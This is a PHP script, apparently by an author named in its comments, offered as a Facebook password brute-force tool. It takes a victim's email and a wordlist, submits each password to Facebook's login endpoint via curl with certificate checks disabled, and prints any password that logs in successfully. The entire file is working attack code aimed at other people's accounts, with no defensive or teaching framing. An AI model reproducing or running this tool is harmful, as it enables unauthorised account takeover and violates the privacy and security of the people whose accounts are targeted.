<?php
	/*
		Criado Por Pablo Santhus
		Facebook Brute Force PHP
		facebook.php v 1.0
		
		Ajuda: php facebook.php emaildavitima@hotmail.com wordlist.txt
		
		obs: após algumas tentativas o facebook irá bloqueia o acesso
		a conta por algumas horas.
	*/

    error_reporting(0);
    banner();
    $email = $argv[1];
    $word = $argv[2];

    function banner(){
    	
      echo "
             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |  C:\> Criado por Pablo Santhus              |    |
           |   |       Facebook Brute Force_                 |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'
        
      [+] Criado Por Pablo Santhus
      [+] Facebook Brute Force
      [+] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt

      \n\n";
	sleep(1);
    }

    function brute($usuario, $senha){
    	
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
      curl_setopt($ch, CURLOPT_HEADER, true);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_POST, true);
      curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$usuario&pass=$senha");
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36");
      curl_setopt($ch, CURLOPT_COOKIE, "datr=80ZzUfKqDOjwL8pauwqMjHTa");
      curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
      curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");
      $source = curl_exec($ch);
      $fp = fopen("log.html", "w");
      fwrite($fp, $source);
      
      if(eregi("facebook.com/home.php", $source)){
        return true;
      }else{
        return false;
      }
    }

    if(isset($argv[1]) && isset($argv[2])){
      $lines = file($word);
      foreach($lines as $line){
        $line = str_replace("\r", "", $line);
        $line = str_replace("\n", "", $line);
        if(brute($email, $line)){
          print "-----------------------------------------------------------------------\n\n";
          echo "[+] Facebook Cracked -> " . "Email: " . $email . " Senha: " .$line .   "\n\n";
          print "-------------------------------------------------------------------------\n";
          exit;
        }else{
          echo "[-] Facebook NOT Cracked -> " . "Email: " . $email . " Senha: " .$line . "\n";
        }
      }
    }else{
    	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt";
    }
    
?>
